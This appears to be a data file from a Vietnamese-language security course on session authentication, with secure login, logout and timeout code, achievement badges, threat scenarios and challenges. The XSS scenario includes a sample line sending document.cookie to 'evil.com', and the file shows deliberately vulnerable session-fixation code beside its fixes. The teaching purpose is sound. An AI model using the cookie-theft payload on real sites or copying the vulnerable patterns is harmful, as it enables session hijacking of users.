        if session['expires_at'] < datetime.now():
            db.sessions.delete(id=session_id)
            return jsonify({'error': 'Session expired'}), 401

        # Update last activity
        db.sessions.update(
            {'id': session_id},
            {'last_activity': datetime.now()}
        )

        request.user = db.users.find_one(id=session['user_id'])
        return f(*args, **kwargs)

    return decorated_function`
    }
  ],

  sessionRegeneration: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Session Regeneration (prevents fixation attacks)
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Invalidate old session if exists
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ id: oldSessionId });
  }

  // Always generate NEW session ID after login
  const newSessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: newSessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000
  });

  res.cookie('sessionId', newSessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000
  });

  res.json({ success: true });
});`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Session Regeneration (prevents fixation attacks)
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)

    # Invalidate old session if exists
    old_session_id = request.cookies.get('sessionId')
    if old_session_id:
        db.sessions.delete(id=old_session_id)

    # Always generate NEW session ID after login
    new_session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': new_session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True})
    response.set_cookie('sessionId', new_session_id,
        httponly=True, secure=True, samesite='Strict', max_age=1800)

    return response`
    }
  ],

  logout: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Complete logout - server and client cleanup
app.post('/logout', async (req, res) => {
  const sessionId = req.cookies.sessionId;

  if (sessionId) {
    // Delete from database
    await db.sessions.delete({ id: sessionId });
  }

  // Clear cookie
  res.clearCookie('sessionId', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });

  res.json({ success: true, message: 'Logged out' });
});`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Complete logout - server and client cleanup
@app.route('/logout', methods=['POST'])
def logout():
    session_id = request.cookies.get('sessionId')

    if session_id:
        # Delete from database
        db.sessions.delete(id=session_id)

    # Clear cookie
    response = jsonify({'success': True, 'message': 'Logged out'})
    response.set_cookie('sessionId', '', expires=0)

    return response`
    }
  ],

  achievements: {
    protocolInitiate: {
      title: 'Khách Tham Quan',
      description: 'Hoàn thành các bài học cơ bản về Session',
      icon: 'User',
      color: 'text-green-400',
    },
    securityOperative: {
      title: 'Bảo Vệ Tòa Nhà',
      description: 'Nắm vững quy trình logout và bảo mật cookie',
      icon: 'Shield',
      color: 'text-blue-400',
    },
    eliteGuardian: {
      title: 'Trưởng An Ninh',
      description: 'Hoàn thành bài học và vượt qua 2 thử thách',
      icon: 'ShieldCheck',
      color: 'text-purple-400',
    },
    masterArchitect: {
      title: 'Kiến Trúc Sư Hệ Thống',
      description: 'Làm chủ hoàn toàn Session Authentication',
      icon: 'Crown',
      color: 'text-yellow-400',
    },
  },

  crossReferences: {
    jwt: {
      title: 'So Sánh: JWT',
      comparison: 'Session dùng Server lưu trạng thái (Stateful). JWT chứa thông tin trong Token (Stateless).',
    },
    mfa: {
      title: 'Nâng Cao: MFA',
      comparison: 'Kết hợp MFA để bảo vệ bước đăng nhập trước khi tạo Session.',
    },
    oauth: {
      title: 'Mở Rộng: OAuth 2.0',
      comparison: 'Dùng Google/Facebook để đăng nhập tạo Session thay vì dùng mật khẩu.',
    },
  },
};

/**
 * Security Scenarios with code examples
 */
export const securityScenarios = [
  {
    id: 'xss-cookie-theft',
    title: 'Đánh cắp Cookie qua XSS',
    threatLevel: 'HIGH' as const,
    attack: 'Hacker chèn mã JavaScript độc hại vào website (ví dụ qua bình luận). Đoạn script này đọc session cookie của nạn nhân và gửi về server của hacker.',
    exploitation: 'Nếu cookie không có flag HttpOnly, hacker dùng `fetch("evil.com?c=" + document.cookie)` để lấy Session ID. Sau đó hacker dùng ID này để mạo danh nạn nhân.',
    defense: 'BẮT BUỘC set flag `httpOnly: true`. Web browser sẽ chặn JavaScript đọc cookie này. Ngoài ra nên dùng Content Security Policy (CSP).',
    vulnerableCode: {
      language: 'javascript' as const,
      label: 'Nguy Hiểm (Vulnerable)',
      code: `// BAD: Cookie accessible to JavaScript
res.cookie('sessionId', sessionId, {
  secure: true,
  sameSite: 'strict',
  // Missing httpOnly: true
});

// Attacker can now steal it:
// <script>fetch('https://evil.com?c=' + document.cookie)</script>`,
    },
    secureCode: {
      language: 'javascript' as const,
      label: 'An Toàn (Secure)',
      code: `// GOOD: HttpOnly prevents JavaScript access
res.cookie('sessionId', sessionId, {
  httpOnly: true,     // Cookie invisible to JavaScript
  secure: true,
  sameSite: 'strict',
});

// Also add CSP header
res.setHeader('Content-Security-Policy', "script-src 'self'");

// Now document.cookie will NOT include sessionId`,
    },
  },
  {
    id: 'session-fixation',
    title: 'Tấn công Session Fixation',
    threatLevel: 'HIGH' as const,
    attack: 'Hacker tạo sẵn một Session ID hợp lệ, sau đó lừa nạn nhân đăng nhập bằng ID này (ví dụ gửi link `login?sid=123`).',
    exploitation: 'Nếu server không tạo ID mới sau khi login, nạn nhân sẽ dùng chung Session ID với hacker. Hacker lúc này ung dung truy cập tài khoản của nạn nhân.',
    defense: 'LUÔN LUÔN tạo mới (regenerate) session ID ngay sau khi đăng nhập thành công. Vô hiệu hóa session cũ ngay lập tức.',
    vulnerableCode: {
      language: 'javascript' as const,
      label: 'Nguy Hiểm (Vulnerable)',
      code: `// BAD: Reuses existing session ID
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Just updates existing session - DANGEROUS!
  const sessionId = req.cookies.sessionId || generateSessionId();
  await db.sessions.update({ userId: user.id }, { where: { sessionId } });

  res.cookie('sessionId', sessionId);
  // Attacker's preset session ID is now authenticated
});`,
    },
    secureCode: {
      language: 'javascript' as const,
      label: 'An Toàn (Secure)',
      code: `// GOOD: Always regenerate session ID on login
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Delete old session
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ where: { sessionId: oldSessionId } });
  }

  // Create NEW session with NEW ID
  const newSessionId = crypto.randomBytes(32).toString('hex');
  await db.sessions.create({
    sessionId: newSessionId,
    userId: user.id,
  });

  res.cookie('sessionId', newSessionId, { httpOnly: true, secure: true });
  // Attacker's old session ID is now useless
});`,
    },
  },
  {
    id: 'forgotten-logout',
    title: 'Quên Đăng Xuất (Máy Công Cộng)',
    threatLevel: 'MEDIUM' as const,
    attack: 'Nạn nhân dùng máy tính công cộng (quán net, thư viện) nhưng quên đăng xuất. Session cookie vẫn còn hiệu lực trên trình duyệt.',
    exploitation: 'Người dùng tiếp theo mở trình duyệt lên, vào website và TỰ ĐỘNG đăng nhập vào tài khoản nạn nhân.',
    defense: 'Cấu hình session timeout ngắn (15-30p). Nên có Absolute Timeout (tự hủy sau 8h dù đang dùng). Hiển thị danh sách thiết bị đang active.',
    secureCode: {
      language: 'javascript' as const,
      label: 'Giải Pháp (Secure Implementation)',
      code: `// Implement both idle timeout and absolute expiration
const SESSION_IDLE_TIMEOUT = 30 * 60 * 1000; // 30 minutes
const SESSION_ABSOLUTE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 hours

async function validateSession(sessionId) {
  const session = await db.sessions.findOne({ where: { sessionId } });

  if (!session) return null;

  const now = new Date();

  // Check absolute expiration
  if (now > session.expiresAt) {
    await db.sessions.delete({ where: { sessionId } });
    return null;
  }

  // Check idle timeout
  const idleTime = now - session.lastActivity;
  if (idleTime > SESSION_IDLE_TIMEOUT) {
    await db.sessions.delete({ where: { sessionId } });
    return null;
  }

  // Update last activity
  await db.sessions.update(
    { lastActivity: now },
    { where: { sessionId } }
  );

  return session;
}`,
    },
  },
];
/**
 * Challenge exports with proper typing
 */
export const challenges = [
  {
    id: 'decode-breach',
    title: 'Giải Mã Vụ Rò Rỉ',
    description: 'Bạn vừa bắt được một session cookie từ hệ thống bị hack. Hãy phân tích xem nó thiếu attribute bảo mật nào và giải thích cách hacker khai thác.',
    difficulty: 'Easy' as const,
    points: 100,
  },
  {
    id: 'build-fort',
    title: 'Xây Dựng Pháo Đài',
    description: 'Viết hàm tạo session an toàn: phải xác thực user, tạo ID ngẫu nhiên, lưu database và set cookie với đầy đủ cờ bảo mật (HttpOnly, Secure).',
    difficulty: 'Medium' as const,
    points: 250,
  },
  {
    id: 'hunt-hacker',
    title: 'Săn Lùng Hacker',
    description: 'Review đoạn code có 5 lỗ hổng chết người: session fixation, XSS cookie theft, CSRF, timing attack và lưu trữ kém. Hãy vá lại tất cả!',
    difficulty: 'Hard' as const,
    points: 500,
  },
];
